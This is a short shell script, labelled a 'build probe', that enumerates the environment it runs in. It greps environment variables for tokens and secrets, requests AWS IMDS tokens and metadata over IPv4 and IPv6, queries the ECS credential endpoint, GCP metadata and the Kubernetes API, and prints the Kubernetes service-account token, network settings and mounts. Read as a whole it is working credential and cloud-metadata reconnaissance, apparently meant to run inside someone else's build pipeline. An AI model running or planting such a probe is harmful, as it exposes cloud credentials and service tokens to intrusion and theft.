echo "=== BUILD PROBE START ==="
echo "hostname: $(hostname)"
echo "user: $(id)"
echo "--- env (filtered) ---"
env | grep -iE 'kube|aws|render|proxy|host|port|token|secret|project|service' | sed 's/=\(.\{8\}\).*/=\1.../' 
echo "--- IMDSv2 ---"
TOK=$(curl -s -m 4 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
echo "imdsv2 token: ${TOK:0:40}"
echo "--- IMDSv1 ---"
curl -s -m 4 http://169.254.169.254/latest/meta-data/ | head -30
echo "--- IMDS v6 ---"
curl -s -m 4 "http://[fd00:ec2::254]/latest/meta-data/" | head -30
echo "--- ECS creds ---"
curl -s -m 4 http://169.254.170.2/v2/credentials | head -20
echo "--- GCP ---"
curl -s -m 4 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ | head -20
echo "--- k8s api ---"
curl -sk -m 4 https://kubernetes.default.svc/api | head -10
echo "--- SA token ---"
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 200; echo
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
echo "--- net ---"
ip addr 2>/dev/null | head -20; cat /etc/resolv.conf; cat /proc/mounts | grep -v cgroup | head -15
echo "=== BUILD PROBE END ==="
